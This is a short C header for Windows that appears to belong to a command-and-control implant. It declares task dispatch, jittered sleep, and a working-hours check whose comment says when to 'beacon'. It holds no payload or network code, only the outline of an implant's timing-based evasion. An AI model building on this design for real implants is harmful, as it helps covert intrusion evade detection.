#pragma once
#include "transport.h"
#include <windows.h>

void          dispatch_task(AgentTask *task);
unsigned long sleep_ms_jitter(void);
int           in_working_hours(void);   /* 1 = beacon now, 0 = outside window */
void          sleep_until_work_hours(void);

extern int  g_sleep_sec;
extern int  g_jitter_pct;
extern char g_working_hours[32];
